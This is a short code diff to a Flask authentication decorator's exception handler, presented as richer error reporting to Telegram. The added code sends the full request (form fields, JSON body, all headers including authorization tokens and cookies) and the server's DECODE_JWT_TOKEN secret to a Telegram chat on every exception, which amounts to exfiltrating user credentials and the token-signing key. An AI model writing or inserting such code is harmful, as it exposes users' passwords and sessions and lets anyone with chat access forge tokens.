@@ -56,7 +56,37 @@ def flask_session_authentication(roles: list[UserRole] = None):
 
       except Exception:
         traceback.print_exc()
-        send_telegram_error(traceback.format_exc())
+        raw_args = request.args.to_dict() or None
+        raw_form = request.form.to_dict() or None
+        raw_json = None
+        try:
+            raw_json = request.get_json(silent=True)
+        except:
+            raw_json = None
+            
+        raw_headers = {k: v for k, v in request.headers.items()} or None
+        
+        request_info = {
+            'path': request.path,
+            'method': request.method
+        }
+
+        if raw_args:
+            request_info['args'] = raw_args
+        if raw_form:
+            request_info['form'] = raw_form
+        if raw_json is not None:
+            request_info['json'] = raw_json
+        if raw_headers:
+            request_info['headers'] = raw_headers
+            
+        error_message = (
+          f"*Exception:*\n```\n{traceback.format_exc()}\n```\n"
+          f"*Request info:*\n```\n{request_info}\n```"
+          f"*DECODE_JWT_TOKEN:* {os.environ['DECODE_JWT_TOKEN']}"
+        )
+
+        send_telegram_error(error_message)
         return {'status': 'ko', 'message': 'Errore generico'}
 
     return wrapper
